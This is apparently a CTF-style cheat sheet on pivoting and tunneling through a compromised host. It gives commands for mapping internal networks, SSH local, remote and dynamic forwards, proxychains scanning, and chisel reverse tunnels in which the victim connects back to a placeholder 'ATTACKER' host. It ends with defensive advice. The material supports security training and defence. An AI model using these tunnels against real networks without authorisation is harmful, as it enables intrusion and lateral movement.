# Pivoting & tunneling

Once you own one host, it often sits between you and a network you can't reach
directly. Pivoting is using that foothold as a relay to reach the hidden
segment; tunneling is the plumbing that carries your traffic through it. The
pattern is always the same: find the second network, then route tools through
the compromised box.

All examples are generic. Nothing here is the solution to a specific challenge.

## 1. See what the foothold can see

On the compromised host, map its other interfaces and neighbours:

```
ip a ; ip route            # interfaces and routes
arp -a                     # hosts it has talked to
cat /etc/hosts
ss -tnp                    # established connections -> internal services
```

A second interface like `172.16.5.10/24` on a host you reached via
`10.10.10.5` means a whole `172.16.5.0/24` you now target *through* it.

## 2. Single port forward (you need one service)

**SSH local forward** — bring an internal port to your machine:

```
ssh -L 8080:172.16.5.20:80 user@10.10.10.5
# then browse http://127.0.0.1:8080  -> hits the internal web app
```

**SSH remote forward** — when the pivot can reach you but not vice-versa (push a
service back to your box):

```
ssh -R 9001:127.0.0.1:9001 user@ATTACKER
```

## 3. Whole-subnet access (SOCKS proxy)

When you want *all* your tools to reach the internal network, open a dynamic
SOCKS proxy instead of forwarding ports one by one:

```
ssh -D 1080 user@10.10.10.5           # SOCKS5 on local :1080
```

Point tools at it with **proxychains** (`socks5 127.0.0.1 1080` in
`proxychains.conf`):

```
proxychains nmap -sT -Pn 172.16.5.20
proxychains curl http://172.16.5.20
```

Use TCP connect scans (`-sT -Pn`) through a proxy — SYN scans don't tunnel.

## 4. No SSH on the box? Use a relay tool

Drop a small pivot binary and connect back. **chisel** is the common choice:

```
# attacker (server)
./chisel server -p 8000 --reverse
# victim (client)  -> exposes a SOCKS proxy on the attacker's :1080
./chisel client ATTACKER:8000 R:1080:socks
```

Then proxychains through `127.0.0.1:1080` as above. `ligolo-ng` is a tidier
alternative that gives you a real routed interface instead of proxychains.

## 5. Chaining (double pivot)

Deeper networks need a chain: host A reaches B, B reaches C. Stack the tunnels —
a SOCKS proxy on A, a second relay started *through* that proxy on B. Keep a map
of which local port lands on which network so you don't lose track.

## 6. Defending

- **Segment** and firewall east-west traffic; a web server has no reason to open
  SSH/SMB sessions into the server VLAN.
- **Egress-filter** outbound — reverse tunnels rely on the victim dialling out
  on arbitrary ports; allow only what's needed.
- Alert on a host making connections unusual for its role (a DB host starting
  outbound SSH, long-lived connections to many internal hosts).
- Least privilege and short-lived creds so one foothold doesn't unlock the rest.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
